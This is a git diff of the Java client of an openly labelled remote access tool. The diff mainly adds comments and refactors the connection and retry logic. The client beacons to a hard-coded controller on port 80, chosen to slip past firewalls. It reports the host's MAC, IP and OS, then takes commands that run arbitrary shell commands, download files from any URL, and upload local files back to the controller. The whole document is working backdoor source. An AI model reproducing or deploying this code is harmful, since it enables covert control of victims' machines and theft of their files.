@@ -6,6 +6,7 @@ import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.net.ConnectException;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
 import java.net.SocketException;
@@ -27,25 +28,47 @@ import tools.ParsedCommand;
  */
 public class Client extends Thread {
 	
-	// Using a domain name to be able to change IP once compiled
+	/**
+	 * Server url.
+	 * Using a domain name to be able to change IP once compiled.
+	 */
 	// private static final String SERVER_URL = "http://rat.chalier.fr";
 	private static final String SERVER_URL = "192.168.1.19";
+	
+	/**
+	 * Server port. 80 by default, as often opened in firewalls.
+	 */
 	private static final int SERVER_PORT = 80;
 	
-	// Client cooldown in milliseconds
+	/**
+	 *  Client cooldown between pings, in milliseconds.
+	 */
 	private static final int REFRESH_COOLDOWN = 10000;
 	
+	/**
+	 * List of client commands.
+	 */
 	private HashMap<String, CommandInterface> commands;
 	
-	// Current connection
+	/**
+	 * The current connection, kept alive until DONE is received.
+	 */
 	private Connection curConn;
 	
+	/**
+	 * Wether to maintain the current connection or not.
+	 */
 	private boolean connected = false;
+	
+	/**
+	 * Client's unique id, given by the server.
+	 */
 	private int id;
 	
 	public Client() {
 		commands = new HashMap<String, CommandInterface>();
 		
+		// Close connection
 		commands.put("DONE", new CommandInterface(){
 
 			@Override
@@ -57,14 +80,19 @@ public class Client extends Thread {
 			
 		});
 		
+		// Execute a shell command
 		commands.put("EXEC", new CommandInterface(){
 
 			@Override
 			public String exec(ParsedCommand pCmd) {
 				
 				try {
+					// Executing shell command
 					Process p = Runtime.getRuntime().exec(pCmd.argLine());
+					// Wait until finished
 					p.waitFor();
+					
+					// Read for answer
 					BufferedReader reader = new BufferedReader(
 							new InputStreamReader(p.getInputStream()));
 					String line;
@@ -72,10 +100,12 @@ public class Client extends Thread {
 					while ((line = reader.readLine()) != null) {
 						output.append(line + "\n");
 					}
+					
+					// Replaying with an OUT command
 					send("OUT " + id, output.toString().getBytes());
 					
 				} catch (IOException | InterruptedException e) {
-					// TODO Auto-generated catch block
+					// TODO Remove before production
 					e.printStackTrace();
 				}
 				return null;
@@ -94,7 +124,7 @@ public class Client extends Thread {
 					send("OUT", "File correctly downloaded.".getBytes());
 					
 				} catch (IOException e) {
-					// TODO Auto-generated catch block
+					// TODO Remove before production
 					e.printStackTrace();
 				}
 				
@@ -110,7 +140,7 @@ public class Client extends Thread {
 			public String exec(ParsedCommand pCmd) {
 				try {
 					
-					// Reading file
+					// Reading file length
 					ArrayList<Byte> tmp = new ArrayList<Byte>();
 					InputStream in = new FileInputStream(pCmd.args[0]);
 					int c;
@@ -127,7 +157,7 @@ public class Client extends Thread {
 					send("UPLD " + pCmd.args[1], payload);
 					
 				} catch (IOException e) {
-					// TODO Auto-generated catch block
+					// TODO Remove before production
 					e.printStackTrace();
 				}
 				return null;
@@ -135,18 +165,26 @@ public class Client extends Thread {
 			
 		});
 		
-		// ADD COMMANDS HERE
 	}
 	
+	/**
+	 * Main client loop.
+	 */
 	@Override
 	public void run(){
 		
 		try {
-			id = Integer.parseInt(send("GETID " + getIdentity()));
-			send("DONE");
-		} catch (NumberFormatException | SocketException e1) {
-			// TODO Auto-generated catch block
-			e1.printStackTrace();
+			// Retrieving id
+			String response;
+			while ((response = send("GETID " + getIdentity(),
+					new byte[] {})).equals("")){
+				// pass
+			}
+			id = Integer.parseInt(response);
+			send("DONE", new byte[]{});
+		} catch (NumberFormatException | SocketException e) {
+			// TODO Remove before production
+			e.printStackTrace();
 		}
 		
 		while (true) {
@@ -154,11 +192,11 @@ public class Client extends Thread {
 			if (connected) {
 				listen();
 			} else {
-				
+				// Wait before sending a PING
 				try {
 					Thread.sleep(REFRESH_COOLDOWN);
 				} catch (InterruptedException e) {
-					// TODO Auto-generated catch block
+					// TODO Remove before production
 					e.printStackTrace();
 				}
 				
@@ -172,6 +210,71 @@ public class Client extends Thread {
 		}
 	}
 	
+	/**
+	 * Sends a request to the server.
+	 * 
+	 * @param request The request containing commands & identification
+	 * @param payload Data to be transfered
+	 * @return Server's response
+	 */
+	private String send(String request, byte[] payload) {
+		
+		try {
+			
+			// Opens a new connection if necessary
+			if (curConn == null)
+				curConn = new Connection(SERVER_URL, SERVER_PORT);
+			
+			// Sending request
+			curConn.write(request, payload);
+			
+			// Blocks until response
+			String response = curConn.readResponse();
+			
+			// Checking wether to close connection or not
+			connected = false;
+			if (response.toString().startsWith("DONE")) {
+				curConn.close();
+				curConn = null;
+			} else {
+				connected = true;
+			}
+			
+			return response.toString();
+		
+		} catch (ConnectException e) {
+			return "";
+		} catch (IOException e) {
+			// TODO Remove before production
+			e.printStackTrace();
+			return null;
+			
+		}
+	}
+	
+	/**
+	 * Waits for a request from the server
+	 */
+	private void listen() {
+		
+		if (curConn == null) {
+			connected = false;
+			return;
+		}
+		
+		String request = curConn.readResponse();
+		
+		ParsedCommand pCmd = new ParsedCommand(request.toString());
+		if (commands.containsKey(pCmd.cmd))
+			commands.get(pCmd.cmd).exec(pCmd);
+	}
+	
+	/**
+	 * Retrieves client's MAC, IP and OS.
+	 * 
+	 * @return A string with all those information
+	 * @throws SocketException
+	 */
 	private String getIdentity() throws SocketException {
 		        
         // Iterating through all network card interfaces
@@ -221,56 +324,13 @@ public class Client extends Thread {
 		
 	}
 	
-	private void listen() {
-		
-		if (curConn == null) {
-			connected = false;
-			return;
-		}
-		
-		String request = curConn.readResponse();
-		
-		ParsedCommand pCmd = new ParsedCommand(request.toString());
-		if (commands.containsKey(pCmd.cmd))
-			commands.get(pCmd.cmd).exec(pCmd);
-	}
-	
-	private String send(String request, byte[] payload) {
-		
-		try {
-			
-			if (curConn == null)
-				curConn = new Connection(SERVER_URL, SERVER_PORT);
-			
-			curConn.write(request, payload);
-			
-			// Blocks until response
-			String response = curConn.readResponse();
-			
-			connected = false;
-			if (response.toString().startsWith("DONE")) {
-				curConn.close();
-				curConn = null;
-			} else {
-				connected = true;
-			}
-			
-			return response.toString();
-		
-		} catch (IOException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-			return null;
-			
-		}
-	}
-	
-	private String send(String request) {
-		
-		return send(request, new byte[] {});
-		
-	}
-	
+	/**
+	 * Download a file from any URL.
+	 * 
+	 * @param fileURL Url pointing to the file.
+	 * @param fileName Local filename
+	 * @throws IOException
+	 */
 	public static void download(String fileURL, String fileName)
 			throws IOException {
 		
@@ -279,18 +339,20 @@ public class Client extends Thread {
 		URL url = new URL(fileURL);
         URLConnection conn = url.openConnection();
 
-        // Opens input stream from the HTTP connection
+        // Opens input stream from the connection
         InputStream inputStream = conn.getInputStream();
          
         // Opens an output stream to save into file
         FileOutputStream outputStream = new FileOutputStream(fileName);
- 
+        
+        // Reads and writes file
         int bytesRead = -1;
         byte[] buffer = new byte[BUFFER_SIZE];
         while ((bytesRead = inputStream.read(buffer)) != -1) {
             outputStream.write(buffer, 0, bytesRead);
         }
-
+        
+        // Closing streams
         outputStream.close();
         inputStream.close();
 	}
